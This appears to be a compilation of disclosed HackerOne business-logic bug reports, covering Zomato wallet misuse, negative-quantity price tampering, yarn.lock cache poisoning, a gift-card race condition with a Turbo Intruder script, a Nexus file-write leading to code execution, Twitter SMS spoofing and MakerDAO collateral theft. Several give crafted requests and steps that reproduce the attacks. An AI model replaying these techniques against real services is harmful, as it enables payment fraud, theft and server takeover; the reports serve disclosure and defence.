- **Report ID:** `938021`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Eternal
- **Reporter:** @pandaaaa
- **Bounty:** 2000 usd
- **Disclosed:** 2020-08-07T19:42:51.400Z
- **CVE(s):** -

**Summary (team):**

We received a report from @pandaaaa wherein he demonstrated a way to avail Zomato Gold membership using random Zomato User's wallet. The report was triaged and rewarded with critical severity with a `CVSS score of 9.3`. 

It was considered critical since a random user's wallet could have been used for unauthorized membership purchases. This was only possible on third party wallets with `status - active` flag.

| Timeline | Action |
|---|---|
| Thu, 23 July 2020, 15:54 IST | @pandaaaa submitted a report with high severity |
| Thu, 23 July 2020, 16:08 IST | Investigation started, the team started analysing the issue |
| Thu, 23 July 2020, 16:47 IST | First contact on Report |
| Thu, 23 July 2020, 16:51 IST | Security Team reproduced the issue |
| Thu, 23 July 2020, 16:54 IST | Internal ticket logged and assigned to the Engineering Team |
| Thu, 23 July 2020, 16:54 IST | Severity upgraded from high to critical (9.3 CVSS) by Security team |
| Thu, 23 July 2020, 17:01 IST | Report triaged |
| Thu, 23 July 2020, 17:12 IST | Bounty rewarded to @pandaaaa  |
| Thu, 23 July 2020, 18:11 IST | Fix deployed on production |
| Thu, 23 July 2020, 18:49 IST | Re-test requested from @pandaaaa to validate the fix |
| Thu, 23 July 2020, 20:03 IST | The researcher confirmed the fix |

**Response time for this report:**

- Investigation started within ***14 minutes***
- Reproduced within ***59 minutes***
- Triaged within ***1 hour, 7 minutes***
- Rewarded within ***1 hour, 12 minutes***
- Fixed within ***2 hours, 17 minutes***

### Background

In Zomato, each user has multiple payment types, one of such payment type is third-party wallets. While purchasing Gold, the user can select the Payment method, if a user selects wallets as payment type, the user can select any of the wallets and the wallet is passed on to the backend, here, there was no check to associate `wallet id` with the user id, so it was possible to use other user's `wallet id`.

### Root cause Analysis

**This was introduced because of a recent code change that went live 13 hours ago.**

- Zomato allows users to avail Gold membership which is being handled by this particular request `https://www.zomato.com/php/pk_handler.php`.

- To successfully purchase the membership, a series of calls are needed to be processed in a particular order. 

- In the First call, user phone number and membership price is sent

```rb
case=getpaymentsdataphone=XXXXXXXcart_value=999.00service_type=REDonline_payments_flag=1country_id=X
```
it then returns all the payment methods available and the last payment method used for a user. 

- For the relevance of this report, only payment methods of `wallet_type` as `third_party_wallet` and `status` as `active` are needed. 

```rb
{  "wallet_id": 8XXXXXXX3,  "balance": 0.01,  "currency": "INR",  "user_id": "14XXXXX2",  "entity_id": "14XXXX2",  "entity_type": "user",  "country_id": 1,  "status": "active",  "vault": "paytm",  "storage_state": "retained",  "reference_id": XXXXXXXXX,  "phone": "XXXXXXXXX",  "email": "XXXXXXXXX@gmail.com",  "expires": XXXXXXXXX,  "balance_display": "₹0.01",  "max_recharge_amount": XXXXXXXXXX,  "wallet_type": "third_party_wallet",  "img_url": "https://b.zmtcdn.com/payments/wallet-logos/paytm.png",  "display_text": "Paytm",  "recharge_available": 1}
```

- On the next call, Payment type selected is used to perform the actual transaction on `https://www.zomato.com/php/red/desktop_payments_handler.php`

```rb
payment_method_id=8XXXXXX1payment_method_type=walletphone=XXXXXXXXXXXXXXXXXcartValue=999.00voucher_code=action=paymentis_renewal=0user_id=1XXXXX2tnc_accepted=false
```
which returns

```rb
{  "status": "success",  "track_id": "ZRD-XXXXXXXXXXXX",  "response_message": "Capture Successful",  "message": "",  "code": 0,  "subscription_id": XXXXXXX,  "amount": 999,  "city_id": 1,  "upgrade_plan_flag": 0,  "restart_subscription_flag": 0,  "transaction_id": XXXXXXXXX,  "thankyou_page_type": "thankyou_inactive",  "text": "You are now a Zomato Gold member",  "redirect_url": "https://www.zomato.com/gold/payment-success?subscription_id=XXXXXX&user_id=XXXXXXXX&is_first_time=1&order_id=XXXXXXX"}
```

- There was no check while performing the transaction to validate if the `wallet id` actually belonged to the user who initiated the call.

### Remediation

- Since it could have allowed to use any random user's `wallet_id` to purchase a Gold membership, the first thing we did was to investigate and see if it was abused since the introduction of this vulnerability.

- **We found no evidence of it being abused** apart from `2 transactions` wherein both of them were test transactions to actually validate/test the issue, one was from @pandaaaa and the other one was from our internal team.

- Our engineers immediately patched the issue and the patch was pushed to production within 2 hours and 17 mins` from the report.

Thanks, @pandaaaa for helping us keep @zomato secure.

Zomato Security Team

---

### [An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss](https://hackerone.com/reports/771694)

- **Report ID:** `771694`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Semrush
- **Reporter:** @yashrs
- **Bounty:** - usd
- **Disclosed:** 2020-04-02T09:35:11.080Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,

When we
**Summary:** 
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to  negative quantities being allowed. 

## Steps To Reproduce:
- Go to https://www.semrush.com/marketplace/offers/
- Click on 500 Words($40) Order Now button.
- Select any two articles.
- Intercept the request:

```
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

- The actual price should be $110 for two articles.

Change the JSON body to :

```
{"items":{"article_500":4,"article_1000":-2}}
```

- The cost will become $20 for two articles:
4 * $40- 2 * $70= $160 - $140 = $20

████

I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
██████████

Regards,
Yash

## Impact

An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush

**Summary (researcher):**

The SEMrush team triaged and patched this issue in less than 24 hours. That's a great turnaround time! It was nice working with the team :)

---

### [[yarn] yarn.lock integrity & hash check logic is broken](https://hackerone.com/reports/703138)

- **Report ID:** `703138`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2020-02-26T13:46:41.721Z
- **CVE(s):** CVE-2019-15608

**Vulnerability Information:**

I would like to report a vulnerability in `yarn`.

It allows to pollute yarn cache via a crafted `yarn.lock` file and place a malicious package into cache under any name/version, bypassing both integrity and hash checks in `yarn.lock` so that any future installs of that package will install the fake version (regardless of integrity and hashes).

# Module

**module name:** `yarn`
**version:** 1.7.3 (`latest` tag)
**npm page:** `https://www.npmjs.com/package/yarn`

## Module Description

> Fast, reliable, and secure dependency management.

## Module Stats

`187 702` downloads in the last day
`998 482` downloads in the last week
`4 214 949` downloads in the last month

# Vulnerability

## Vulnerability Description

In short: integrity check logic _and_ hash check logic seems broken.

* Integrity/hash checks seem to be performed when placing a package to cache, not when a package is taken out of the cache. It’s a bit tricky though.

* It is easy to get installs pass with both hash and integrity simultaneously mismatching in yarn.lock, without any manual intervention apart from calling yarn on crafted lockfiles (to pollute cache).

So, more details on what is happening:

1. When the package is downloaded, only integrity is checked.
   The package is saved into cache with its sha1 hash. sha1 hash is not checked.

2. When the package is taken out of cache, it’s taken by name + version + sha1 hash.
   Integrity is not checked (completely ignored).

3. When one pollutes a cache by specifying incorrect hash in yarn.lock
   (but correct integrity), that hash is trusted and goes into cache.

4. After that, installing yarn.lock files with both that specific incorrect hash
   and any integrity just pass, until yarn cache is cleared.

5. Removing node_modules does not help, only clearing yarn cache helps.

While that might seem just moderately dangerous at the first glance (integrity needs to match once), there is a larger problem with that:

It is very simple to trick yarn into putting an *completely unrelated package* into cache, including a different package or even a tgz file that is not even coming from npm registry. And integrity is not checked afterwards.

## Steps To Reproduce:

Code to reproduce is shared with Yarn maintainers via https://github.com/ChALkeR/yarnbug2.

It used the following logic:

(1). Create a `yarn.lock` file by installing the _payload_ package or tgz file, e.g.:
```
  "dependencies": {
   "ponyhooves": "^1.0.1"
  }
```
```
ponyhooves@^1.0.1:
  version "1.0.1"
  resolved "https://registry.yarnpkg.com/ponyhooves/-/ponyhooves-1.0.1.tgz#e57c9c3e976d570f97f229356ca5d6ee13efd358"
  integrity sha1-5XycPpdtVw+X8ik1bKXW7hPv01g=
```

(2). Replace the package name, version, and hash with _target_ package. Leave integrity intact.
  
```
  "dependencies": {
    "express": "4.11.1"
  }
```
```
express@4.11.1:
  version "4.11.1"
  resolved "https://registry.yarnpkg.com/ponyhooves/-/ponyhooves-1.0.1.tgz#36d04dd27aa1667634e987529767f9c99de7903f"
  integrity sha1-5XycPpdtVw+X8ik1bKXW7hPv01g=
```
  
(3). Installing this yarn.lock will pollute `express@4.1.11` package in yarn cache (if it is not already present there). Any future installs of `express@4.1.11` will resolve to this payload package -- hashes match with express, and integrity check is ignored.

## Workaround

`yarn cache clean` before installs.

## Patch

* Cache should check both hash and integrity on initial install (not just integrity). That is not a sufficient fix though (sha1 is weak).
* Cache should take integrity into account, so that if integrity in`yarn.lock` mismatches integrity of the archive that was placed in cache, install should error or ignore the cached version.

## Supporting Material/References:

- Node.js v12.11.0
- npm v6.11.3

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

I am sponsored by [Exodus](https://exodus.io) to perform security research.

## Impact

Pollute local yarn cache with malicious packages and bypass hash/integrity checks.

It is even possible to execute `postinstall` this way even if the original malicious package has been installed with `yarn --ignore-scripts`.

---

### [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247)

- **Report ID:** `759247`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Reverb.com
- **Reporter:** @muon4
- **Bounty:** - usd
- **Disclosed:** 2020-01-25T17:58:21.425Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team!

I've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can easily buy stuff just bying one gift card and redeem it over and over again.


## Steps to reproduce

### Preparations
- Burp Suite Pro
- Turbo Intruder

Note: This also can be reproduced other way but this is maybe the easiest

### The attack

- Login
- Buy a gift card
- Now redeem it at `https://sandbox.reverb.com/<lang>/redeem`
- Intercept the request which will be following:

```
POST /fi/redeem HTTP/1.1
Host: sandbox.reverb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://sandbox.reverb.com/fi/redeem
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Connection: keep-alive
Cookie: <cookies>

utf8=%E2%9C%93&authenticity_token=<CSRF token>&token=<GIFT card>&commit=Redeem+Now
```

- Send it to the turbo intruder
- Use this python code as a payload of the turbo intruder

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
	engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
	table.add(req)
```

- Now set the external HTTP header `x-request: %s` - This is needed by the turbo intruder
- Click "Attack" 
- See multiple 200 OK responses:

{F660741}

- Check your Reverb bucks and see that you have a way more money than the gift card actually was worth of:

{F660740}

In my case I bought one gift card which was worth of 25$ and as we can see from the picture I was able to redeem it 7 times which makes 25*7 = 175$.

If you need any information please let me know.

Cheers!

## Impact

Race Condition can be used for get almost free stuff and steal money.

---

### [Improper handling of payment callback allows topping up a Swiss Starbucks Card bypassing actual payment via a crafted success message](https://hackerone.com/reports/682617)

- **Report ID:** `682617`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Starbucks
- **Reporter:** @khovansky
- **Bounty:** - usd
- **Disclosed:** 2019-11-18T22:19:34.900Z
- **CVE(s):** -

**Summary (team):**

khovansky uncovered that an attacker could register on https://xtras.starbucks.ch and utilizing that registration, subsequently generate a reset password email via https://card.starbucks.ch 

After resetting the password for the account, khovansky noticed this process auto generates a virtual Swiss Starbucks card. khovansky could then top up this virtual card without completing a transaction by forging a "payment successful" callback.

@khovansky — thank you for reporting this vulnerability and your assistance confirming the resolution.

---

### [Unrestricted File Upload Leading to Remote Code Execution](https://hackerone.com/reports/683965)

- **Report ID:** `683965`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Central Security Project
- **Reporter:** @hland
- **Bounty:** - usd
- **Disclosed:** 2019-10-30T20:05:22.210Z
- **CVE(s):** CVE-2019-15893

**Vulnerability Information:**

### Description
As an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.

In the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. 

The tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.

### Additional Details
Unfortunately I was unable to dig up the functions handling these HTTP requests.

## Steps to reproduce:
1. Create a repo and set the "overrideLocalStorageUrl" to a folder two levels below the one you want to write files to.

`POST /nexus/service/local/repositories`

2. Upload a file to a directory of your choice by manipulating the "g", "a" and "v" parameters

`POST /nexus/service/local/artifact/maven/content`


### Proof-Of-Concept

1. Create repository:

```
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
X-Nexus-UI: true
Content-Length: 443
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
```

2. Upload file

```
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770
Upgrade-Insecure-Requests: 1

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="file"; filename="calc.exe"
Content-Type: text/html

<insert_content_of_calc.exe>
-----------------------------103850373015325909411337083269--


HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 17:05:47 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: text/html;charset=UTF-8
Content-Length: 77
Connection: close

{"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
```

## Patch
There are multiple ways to fix this:

1. Make it the default to run Nexus Repository Manager as a less privileged user. 
2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.

## Additional details

* OS Name:                   Microsoft Windows Server 2016 Datacenter
* OS Version:                10.0.14393 N/A Build 14393

* java version "1.8.0_211"
Java(TM) SE Runtime Environment (build 1.8.0_211-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

My reaction when uploading files to any location on the filesystem:
https://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif

## Impact

The attacker could run arbitrary code on the server as the SYSTEM user.

**Summary (team):**

https://support.sonatype.com/hc/en-us/articles/360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03

---

### [Ability to perform actions (Tweet, Retweet, DM) and other actions, unauthenticated, on any account with SMS enabled.](https://hackerone.com/reports/470749)

- **Report ID:** `470749`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** X / xAI
- **Reporter:** @antisocial_eng
- **Bounty:** - usd
- **Disclosed:** 2019-09-26T22:58:00.514Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** By knowing the mobile phone number associated with a Twitter account, or by using random mobile phone numbers! It is possible to perform the following actions against a target without their knowledge or interaction. With no account takeover scenario.

It's a case of, if I know the mobile number... I can control basic functions of the account.

I can do everything that is listed here: https://help.twitter.com/en/using-twitter/sms-commands on an account, completely unauthenticated.


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Spoof target number, send an SMS to a special short code for the geographical location, as seen here: https://help.twitter.com/en/using-twitter/supported-mobile-carriers


## Impact: Massive. I can remove the SMS two factor of the account. I can DM people without them knowing. If I had the mobile number of Donald Trump, I could send Tweets as him... There is so much wrong here. 

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

https://twitter.com/___Sh4rk___/status/1076204152546619392 this is a tweet I sent from my close friends account. She did not reveal her password or authenticate it at all.

## Impact

Remove 2FA

Tweet on someones behalf.

DM Someone.

Delete someones tweets

Turn off all phone SMS notifications

Follow people

Unfollow people.

Block/Report people - with a little script I could get 10000 phone numbers all reporting innocent tweets. Controlling media etc

More stuff really.

---

### [Steal collateral during `end` process, by earning DSR interest after `flow`.](https://hackerone.com/reports/672664)

- **Report ID:** `672664`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @lucash-dev
- **Bounty:** - usd
- **Disclosed:** 2019-09-09T16:50:17.991Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

The `end` contract in MCD controls the process of shutting down
the MCD contracts and allowing for users to redeem their DAI for
collateral -- presumably to migrate to a new implementation of DAI.
The process, however, doesn't prevent the continued functioniong
of DAI savings accounts (`pot` contract), which allows for continued
minting of DAI after all other contracts have been "caged", resulting
in theft (possibly involuntary) of collateral.

## Detailed Description

The `end` contract is responsible for orchestrating the complex sequence
of steps for shutting down the MCD eco-system, settling all existing DAI
into collateral during the process.

The first step in the process is the method `cage`, which ensures that other
MCD contracts stop operating in the normal way, and enter a "not-live" mode.
In particular, the `vat` contract is updated to prevent the creation of new
CDP's, and also prevents the accrual of interest (`vat.fold`). This is obtained by
calling the `cage` method in the `vat` contract.

Puzzingly, however, the `end.cage` method doesn't affect the state of the `pot`
(savings account) contract, allowing for interests to be continuously earned
-- and new DAI to be minted --indefinitely during all the phases of the `end`
process. Most significantly, it allows a user to mint new DAI even after the
final DAI/collateral rate has been fixed (`end.flow`).

The consequence is that it's possible to inflate the DAI supply so that there
isn't enough collateral for all of it to be redeemed. In that case the last
users to try to redeem will have their collateral stolen by the faster ones, as
they might well be unable to redeem any DAI at all.

An example might help clarify the problem:

- Suppose there are two users, Ali and Bob, who each control 50% percent of the
DAI supply, lets say 10 DAI each.

- Now let's assume the `end` process is initiated and proceeds as usual --
eventually reaching the `flow` stage, with a fixed exchange rate of 1 DAI / ETH.

- Let's also assume that there is a DSR rate of 100% a month (unrealistic, but makes
the numbers easier).

- After the `end.flow` is called, Ali notices that the he can still use `pot` to earn
interests, so he deposits all his DAI in `pot`. Meanwhile Bob can't do the same
as his funds are locked inside a Dapp (let's say an Augur market).

- After one month, Ali calls `pot.exit` and gets back 20 DAI. That corresponds to
the total original supply of DAI before `end.flow` was called. So, Ali calls
`end.pack` and `end.cash` to convert his 20 DAI into 20 ETH -- all the collateral
in the MCD contracts.

- When Bob tries to redeem his DAI, there is no collateral left. His `end.cash`
calls fail and he ends up with no tokens -- DAI or ETH -- at all.

## Steps to Reproduce

I've attached to this report a version of `end.t.sol` that adds a test scenario
(`test_steal_collateral_using_dsr_after_thaw`) to reproduce this attack (in fact, the example above).

Please don't hesitate to contact me if you need more help reproducing it.

## Possible Remediation

The issue could be completely prevented by introducing a `cage` functionality into
the `pot` contract, and not allowing the `pot.drip` method to be called when
not in live mode.

Please note that the above solution is provided as proof that the reported issue
is fixable. I make no claim that the above is the best available solution.


## Impact

Please refer to the "Impact Analysis" field for more details.

## Final Note

Please don't hesitate to contact me if you need any further clarification around
this issue, or help reproducing and evaluating it.

## Impact

## Impact Analysis

As clearly demonstrated above, the reported bug can be used to steal collateral
from the `end` contract. Even more disturbingly, the bug can likely cause users
that own DSR deposits to unwittingly steal collateral in case of a shutdown.

Let's evaluate how much collateral can be stolen in this scenarios. The amount
stolen depends on three factors:

1 - DSR savings rate.
2 - Portion of DAI kept in DSR deposits.
3 - Time distribution of users calling `end.pack`.

It's impossible to know beforehand either. But we can make educated guesses
about a worst-case scenario.

It's possible that the DSR rate will be set at a high value at some point.
Considering that the previous incarnation of DAI saw a the CDP rate reach
25% at some point, it's definitely possible for DSR to reach a slightly lower
rate, say 20%. Furthermore, it's likely all users (including Dapps) will keep
their DAI holdings in DSR deposits, doing so has a possible upside, and minimal
gas costs.

As for the time-distribution of users redeeming their DAI, it's again entirely
possible that a large portion of the DAI supply will be used to interact with
Dapps rather than held speculatively. Augur V2, for example, has plans to use
DAI for making bets on prediction markets. Since these markets might take
quite a long time to be resolved -- up to several months -- it's unlikely
that a DAI shutdown would cause an immediate withdrawal of DAI by Augur users
-- if the reported vulnerability isn't known.

Other Dapps might well have similar characteristics, though it's again impossible
to know beforehand.

Given the above -- DSR rates up to 20% and most of DAI locked in DSR deposits
inside Dapps for months -- it's perfectly possible that the bug leads to
a loss of 10% or more of the collateral in the MCD contracts.

That scenario might happen even without an intentional attack.

---

### [Able to manipulate order amount by removing cancellation amount and cause financial impact](https://hackerone.com/reports/614523)

- **Report ID:** `614523`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Eternal
- **Reporter:** @sjvino
- **Bounty:** - usd
- **Disclosed:** 2019-08-16T04:39:18.470Z
- **CVE(s):** -

**Summary (team):**

@sjvino identified an issue where it could have allowed to tamper the cancellation amount and pay less than the actual order amount.

Steps submitted by the researcher to reproduce the issue (maybe it will help new folks in the community to learn something out of it) -

- Select Items and add them to the cart
- Set a proxy and intercept the request before making the payment
- Select payment method and intercept the request, change the cancellation_amount parameter to 0, it will reduce the order amount and cancel all the previous cancellation charges on that account.

Regards,
Zomato Security Team

---

### [Earn free DAI interest (inflation) through instant CDP+DSR in one tx](https://hackerone.com/reports/665798)

- **Report ID:** `665798`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @lucash-dev
- **Bounty:** - usd
- **Disclosed:** 2019-08-12T23:44:52.395Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The MCD contracts contain different mechanisms for accumulating rates in different
contracts, namely `pot` and `jug` corresponding to the cost of a loan and interest
earned on savings. Because these rates are not synchronised, and depend on the
call to the `drip` method to be calculated, it's possible to game the system
to obtain returns on DAI "savings" that exist only within a transaction.
This means all holders of ETH/gems can costlessly and risklessly earn interest
from the `pot` contract without ever holding DAI for any amount of time.
This leads to inflation of the DAI supply and transfer of value to attackers.

## Detailed Description of the Attack Mechanism

One of the novel features introduced in the MC contracts is the concept of DSR
(DAI Savings Rate) which incentivises investors to hold DAI, by allowing them
to earn interest on DAI deposits in the `pot` contract.
Normally that doesn't result in overall inflation of the DAI supply,
as the only ways of obtaining the DAI to deposit on the "savings account" is by
either acquiring a CDP (Collateralised Debt Position) or buying DAI from someone
else. As repaying a CDP will require an amount of DAI increasing with time, the
overall economic effect is a net increase in DAI value.

In practice, however, both the Stability Fee rates and the DSR rate accrue at discrete
moments in time (rather than continuously), whenever a user calls the method
`drip` on the `jug` or `pot` contracts. As these methods are not synchronised
between the `jug` and `pot` contracts it is possible, by carefully sequencing
method calls to perform a transaction with the following steps:

1. Transform the ETH/token into gem balance, using the `join` contract.
2. Create a CDP urn (vat.frob), obtaining the maximum amount of DAI from the gem balance.
3. Deposit the resulting DAI balance into `pot` (`join` method).
4. Update accumulated DSR rate (`pot.drip`).
5. Withdraw DAI from `pot` (`exit` method), obtaining the DAI deposited in 3 plus
interest.
6. Repay CDP (again, `vat.frob`), getting back the gem balance.
7. Transform back the gem balance into ETH/token.

At first glance the attack might not seem very practical, since there's no way
to guarantee that no other transaction with call `pot.drip` in the same block, and
that the time between calls to drip might be just a few seconds, earning a minimal
amount of interest.
In practice, a balance of several million USD worth of tokens would be enough to
obtain interest payments larget than the gas cost of each call -- this could be
easily crowdsourced in a trustless contract that splits the profits according to
size of ETH/token deposits by participants, or easily obtained by some individual
investors (e.g. exchanges).
Even if the attack doesn't earn an interest in every instance (due to `pot.drip`
having already been called in the same block), a random portion of successful
occurrences would be enough to make executing it repeatedly profitable. Moreover,
the crowdsourcing contract could obtain miner collaboration by paying them a portion of profits or
extremely high fees.

If a crowdsourced attacker is correctly built and publicised, nothing prevents
every single ETH/token holder from depositing their holdings in it, and profitably
participating (with minimal cost and no risk) in a continuous attack on the MCD contracts,
earning interest on a total balance worth billions USD -- and considerably inflating
the DAI supply.

The attack will become clearer by inspecting a concrete example.


## Reproducing the Attack - Example Crowdsourcer Contract

Please find attached the file `antivat.t.sol` which includes an example crowdsourcer
contract (AntiVat) capable of accepting ETH deposits from users, and executing
the CDP+DSR attack (`grabFreeDai` method). The contract also distributes profits
proportionally between contributors.

The contract could be easily extended to support other gems and to provide an
incentive to the miner.

Please note that this attacker contract is provided merely as an example for
helping in reproducing the bug.

## Possible Fix

As a suggested fix, calling `pot.drip` from within the call to `vat.frob` would
render the attack impossible (interest would always be zero).

Please note that I make no claim that the above is the best way of fixing the issue.
The suggested fix is provided only as proof that this is a fixable bug in the
contracts.

## Impact Analysis

Please refer to the "Impact Analysis" field below for a detailed analysis.

## Impact

This section will proceed to demonstrate that this is a critical bug that meets
(and exceeds) the requirements stated in the policy.

In the description above I've already made the points that:
1 - The issue reported is fixable.
2 - The attack has minimal cost when performed by a crowdsourced contract (or
high-balance attacker).

I'll proceed to show that:
3 - It's possible to steal 10% (or more) of the value of the collateral in the
system.

The attack described consists of repeatedly obtaining DAI interest over large
balances in ETH/token that could be used for collateral, but without increasing
the overall collateral locked in the system. As the DAI interest is paid for with
newly created DAI, this corresponds to a continuous inflation of the DAI supply,
transferring value continuously from legitimate holders of DAI.

Ultimately, given enough time, virtually all the DAI market cap could be in the hands of
the attackers. The only limiting factor is time, and the rate at which value can
be stolen is a function of the value of ETH and collateral tokens available to the
attackers (which could well be the economic majority in the ETH ecosystem), the
DSR rate, and the "Line" limit.

Assuming, as an example, that the DSR rate is 2% a year, that the available ETH
supply is 20x that of the collateral in the MCD contracts, and that the "Line" limit
is higher than that -- after one year (assuming successful attack in most blocks)
the attackers would have inflated the DAI
supply in 40%, transfering much more than 10% of collateral value to themselves.

It's impossible to know beforehand what values the DSR rate and the "Line" limit
will have, but all they can do without breaking the contract functionality is
to slow down the theft. (a DSR rate of 0% would effectively kill the DAI savings
functionality, and low "Line" values that prevent DAI from being created in the
attack would also affect the possibility of new legitimate users joining the system)

# Final Note

I understand this is an involved attack, exploiting an issue in the interaction
between several contracts, and with complex economic consequences.
Please don't hesitate in contacting me for further explanations or to provide
any information that can help you reproduce and evaluate the issue.

---

### [OLO Total price manipulation using negative quantities](https://hackerone.com/reports/364843)

- **Report ID:** `364843`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Upserve 
- **Reporter:** @fuzz
- **Bounty:** - usd
- **Disclosed:** 2019-07-06T17:59:06.463Z
- **CVE(s):** -

**Vulnerability Information:**

Manipulating an order request JSON object, containing an additional item with a negative quantity directly manipulates the total amount of the order.

In the following JSON request, an order is submitted for 2 ChickenBurgers ($12 each), as well as -1 BreadPuddings ($9 each).

